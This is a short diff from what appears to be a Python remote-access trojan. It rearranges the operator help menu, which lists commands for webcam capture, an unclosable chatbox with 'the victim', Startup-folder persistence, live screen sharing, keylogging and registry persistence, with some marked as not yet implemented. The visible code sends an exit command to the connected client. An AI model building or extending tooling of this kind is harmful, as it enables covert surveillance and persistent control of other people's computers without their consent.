@@ -93,13 +93,14 @@ def communication(client):
                 !webcam_snap                       --> Picture from the WebCam
                 !chatbox                           --> Open a ChatBox with the victim (window not closable for victim)
                 !persist                           --> try persistence : cp exe in \%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
-                !screenshare <time btw frames (sec)--> screenshare live
+                
 
-                (++ NOT IMPLEMENTED ++)
-                keylog_start                      --> Start The Keylogger
-                keylog_dump                       --> Print Keystrokes That The Target Inputted
-                keylog_stop                       --> Stop And Self Destruct Keylogger File
-                persistence *RegName* *fileName*  --> Create Persistence In Registry''')
+                (++ NOT IMPLEMENTED YET ++)
+                !screenshare <time btw frames (sec)--> screenshare live
+                keylog_start                       --> Start The Keylogger
+                keylog_dump                        --> Print Keystrokes That The Target Inputted
+                keylog_stop                        --> Stop And Self Destruct Keylogger File
+                persistence *RegName* *fileName*   --> Create Persistence In Registry''')
             
             elif(split[0] == "!exit"):#disconnect
                 send(client, command)
